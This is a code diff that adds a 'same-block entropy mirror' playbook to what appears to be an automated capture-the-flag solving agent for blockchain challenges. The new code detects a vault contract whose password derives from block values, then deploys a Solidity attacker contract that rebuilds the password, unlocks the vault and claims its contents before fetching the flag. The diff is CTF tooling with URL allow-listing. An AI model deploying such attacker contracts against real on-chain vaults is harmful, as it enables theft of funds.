@@ -54,6 +54,8 @@ class BlockchainAgent(BaseAgent):
             "witnessed_calldata_replay",
             "erc20_integer_underflow",
             "unchecked_arithmetic_pre_0_8",
+            "same_block_entropy_mirroring",
+            "evm_private_storage_reasoning",
         ]
 
     def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
@@ -275,6 +277,41 @@ class BlockchainAgent(BaseAgent):
                 },
             }
 
+        # Same-block entropy mirror: source can make a password look private
+        # while deriving it entirely from values available to another contract
+        # executing in the same transaction. A helper contract reproduces the
+        # derivation and uses the source-defined unlock/claim lifecycle.
+        magic_vault_flag = self._try_same_block_magic_vault(
+            rpc_url=rpc_url,
+            private_key=private_key,
+            target_address=target_address,
+            setup_address=setup_address,
+            flag_url=flag_url,
+            solidity_sources=solidity_sources,
+            steps=steps,
+        )
+        if magic_vault_flag:
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "solved",
+                "flag": magic_vault_flag,
+                "steps": steps,
+                "techniques": [
+                    "solidity_source_analysis",
+                    "same_block_entropy_mirroring",
+                    "evm_private_storage_reasoning",
+                    "attacker_contract_deploy",
+                    "signed_web3_transactions",
+                ],
+                "artifacts": {
+                    "same_block_entropy_mirror": {
+                        "transactions_bounded": 1,
+                        "captured_sensitive_values": False,
+                    }
+                },
+            }
+
         # Source-driven attacker-contract drain: solves the "damage requires a
         # contract caller" pattern by reading the challenge's own contracts and
         # deploying a bespoke attacker. Runs before the legacy EOA-only lifecycle.
@@ -448,6 +485,160 @@ class BlockchainAgent(BaseAgent):
 
     def get_capabilities(self) -> List[str]:
         return self.capabilities
+
+    # ------------------------------------------------ same-block entropy mirror
+    def _try_same_block_magic_vault(
+        self,
+        *,
+        rpc_url: str,
+        private_key: Optional[str],
+        target_address: Optional[str],
+        setup_address: Optional[str],
+        flag_url: Optional[str],
+        solidity_sources: Dict[str, str],
+        steps: List[str],
+    ) -> Optional[str]:
+        """Mirror source-defined block entropy inside one helper transaction.
+
+        The supported pattern derives a private password from ``blockhash`` and
+        ``block.timestamp``, but the constructor's passphrase collapses to a
+        public constant because ``blockhash(block.timestamp)`` is always out of
+        range. A helper contract observes the same block values and public nonce,
+        reconstructs the password, unlocks the target, and claims its contents.
+        """
+        if not all((rpc_url, private_key, target_address, setup_address, flag_url)):
+            return None
+        joined = "\n".join(solidity_sources.values())
+        if not self._is_same_block_magic_vault(joined):
+            return None
+
+        try:
+            import requests
+            import solcx
+            from web3 import Web3
+        except ImportError as exc:  # pragma: no cover - setup diagnostic covers this
+            steps.append(f"Same-block entropy mirror unavailable (missing dependency: {exc}).")
+            return None
+
+        assert_url_allowed(rpc_url)
+        assert_url_allowed(flag_url)
+        try:
+            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 15}))
+            if not web3.is_connected():
+                steps.append("Same-block entropy mirror could not connect to the RPC endpoint.")
+                return None
+            acct = web3.eth.account.from_key(private_key)
+            target = Web3.to_checksum_address(target_address)
+            setup_address = Web3.to_checksum_address(setup_address)
+            version = self._solc_version(joined)
+
+            installed = {str(item) for item in solcx.get_installed_solc_versions()}
+            if version not in installed:
+                solcx.install_solc(version)
+            solcx.set_solc_version(version)
+            compiled = solcx.compile_source(
+                self._same_block_magic_vault_solver_source(version),
+                output_values=["abi", "bin"],
+            )
+            key = next(name for name in compiled if name.endswith(":MagicVaultSolver"))
+            solver = web3.eth.contract(
+                abi=compiled[key]["abi"],
+                bytecode=compiled[key]["bin"],
+            )
+            tx = solver.constructor(target).build_transaction({
+                "from": acct.address,
+                "nonce": web3.eth.get_transaction_count(acct.address),
+                "gas": 900_000,
+                "gasPrice": web3.eth.gas_price,
+                "chainId": web3.eth.chain_id,
+            })
+            signed = acct.sign_transaction(tx)
+            receipt = web3.eth.wait_for_transaction_receipt(
+                web3.eth.send_raw_transaction(signed.raw_transaction),
+                timeout=60,
+            )
+            if int(receipt.status) != 1:
+                steps.append("Same-block entropy mirror transaction reverted.")
+                return None
+            steps.append(
+                "Mirrored the source-defined block entropy and completed unlock/claim "
+                "inside one helper-contract deployment."
+            )
+
+            setup = web3.eth.contract(
+                address=setup_address,
+                abi=[{
+                    "inputs": [],
+                    "name": "isSolved",
+                    "outputs": [{"type": "bool"}],
+                    "stateMutability": "view",
+                    "type": "function",
+                }],
+            )
+            if not bool(setup.functions.isSolved().call()):
+                steps.append("Setup.isSolved() remained false after the entropy-mirror transaction.")
+                return None
+            steps.append("Verified Setup.isSolved() == true after the bounded transaction.")
+
+            response = requests.get(flag_url, timeout=10)
+            flag = find_first_flag(response.text if response.status_code == 200 else "")
+            if flag:
+                steps.append("Retrieved an evidence-bound flag after on-chain solve verification.")
+                return flag
+            steps.append("The verified solve endpoint returned no HTB-format flag.")
+        except Exception as exc:  # noqa: BLE001 - playbook failure must fall through safely
+            steps.append(f"Same-block entropy mirror did not complete: {exc}")
+        return None
+
+    @staticmethod
+    def _is_same_block_magic_vault(source: str) -> bool:
+        compact = re.sub(r"\s+", " ", source)
+        required = (
+            r"function\s+unlock\s*\(\s*bytes16",
+            r"function\s+_magicPassword\s*\(",
+            r"blockhash\s*\(\s*block\.timestamp\s*\)",
+            r"block\.timestamp\s*%\s*2\s*\+\s*1",
+            r"function\s+claimContent\s*\(",
+            r"map\.holder\s*=\s*msg\.sender",
+            r"TARGET\.mapHolder\s*\(\s*\)\s*!=\s*address\s*\(\s*TARGET\s*\)",
+        )
+        return all(re.search(pattern, compact) for pattern in required)
+
+    @staticmethod
+    def _same_block_magic_vault_solver_source(version: str) -> str:
+        return f"""
+pragma solidity {version};
+
+interface IMagicVault {{
+    function owner() external view returns (address);
+    function nonce() external view returns (uint256);
+    function unlock(bytes16 password) external;
+    function claimContent() external;
+}}
+
+contract MagicVaultSolver {{
+    constructor(address target) {{
+        IMagicVault vault = IMagicVault(target);
+        uint256 currentNonce = vault.nonce();
+        bytes32 passphrase = keccak256(abi.encodePacked(uint256(0)));
+        uint256 reductor = block.timestamp % 2 + 1;
+        uint256 key1 = uint256(keccak256(abi.encodePacked(
+            uint256(blockhash(block.number - reductor)) + currentNonce
+        )));
+        uint128 key2 = uint128(uint256(keccak256(abi.encodePacked(
+            uint256(blockhash(block.number - 2)) + currentNonce + 1
+        ))));
+        bytes8 secret = bytes8(bytes16(uint128(
+            uint128(bytes16(bytes32(uint256(passphrase) ^ key1))) ^ key2
+        )));
+        bytes8 magicPassword = secret >> 32 | secret << 16;
+        uint128 secretKey = uint128(bytes16(magicPassword) >> 64);
+        uint128 ownerBits = uint128(uint64(uint160(vault.owner()))) << 64;
+        vault.unlock(bytes16(ownerBits | secretKey));
+        vault.claimContent();
+    }}
+}}
+""".strip()
 
     # -------------------------------------------------------- ERC20 underflow buy
     _ERC20_MIN_ABI = [
